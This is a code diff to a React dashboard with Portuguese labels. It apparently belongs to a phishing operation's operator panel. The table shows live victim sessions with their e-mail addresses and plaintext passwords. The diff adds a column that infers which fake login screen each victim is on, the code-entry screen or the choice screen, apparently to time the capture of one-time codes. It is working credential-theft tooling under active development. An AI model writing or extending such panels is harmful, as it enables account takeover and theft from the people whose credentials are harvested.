@@ -418,47 +418,41 @@ export default function Dashboard() {
                 <thead className="bg-muted/40 text-[10px] uppercase tracking-wide text-muted-foreground">
                   <tr>
                     <th className="px-4 py-3 text-left font-medium">Última atividade</th>
-                    <th className="px-4 py-3 text-left font-medium">Anúncio</th>
                     <th className="px-4 py-3 text-left font-medium">
                       <span className="inline-flex items-center gap-1"><Mail className="h-3 w-3" /> E-mail</span>
                     </th>
                     <th className="px-4 py-3 text-left font-medium">
                       <span className="inline-flex items-center gap-1"><KeyRound className="h-3 w-3" /> Senha</span>
                     </th>
+                    <th className="px-4 py-3 text-left font-medium">
+                      <span className="inline-flex items-center gap-1"><Monitor className="h-3 w-3" /> Tela atual</span>
+                    </th>
                     <th className="px-4 py-3 text-left font-medium">Dispositivo</th>
-                    <th className="px-4 py-3 text-left font-medium">Aguardando</th>
                   </tr>
                 </thead>
                 <tbody>
                   {activeSessions.map((s) => {
-                    const ad = adTitles[s.ad_id];
                     const hasPassword = s.password !== "—";
+                    // Inferência da tela atual:
+                    // - tem senha → já passou da escolha, está na tela do código
+                    // - só tem e-mail → na tela de escolha (senha ou código)
+                    const screenLabel = hasPassword ? "Tela código" : "Tela escolha";
                     return (
                       <tr key={s.session_id} className="border-t border-border hover:bg-muted/30">
                         <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                           {formatTime(s.lastActivity)}
                         </td>
-                        <td className="px-4 py-3 text-xs">
-                          {ad ? (
-                            <div className="flex flex-col">
-                              <span className="truncate font-medium">{ad.title}</span>
-                              <span className="truncate font-mono text-[10px] text-muted-foreground">/{ad.slug}</span>
-                            </div>
-                          ) : (
-                            <span className="text-muted-foreground">—</span>
-                          )}
-                        </td>
                         <td className="break-all px-4 py-3 font-mono text-xs">{s.email}</td>
                         <td className="break-all px-4 py-3 font-mono text-xs">
                           {hasPassword ? s.password : <span className="text-muted-foreground">—</span>}
                         </td>
-                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">
-                          {deviceLabel(s.user_agent)}
-                        </td>
                         <td className="whitespace-nowrap px-4 py-3 text-xs">
                           <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
-                            {hasPassword ? "código" : "senha ou código"}
+                            {screenLabel}
                           </span>
+                        </td>
+                        <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">
+                          {deviceLabel(s.user_agent)}
                         </td>
                       </tr>
                     );
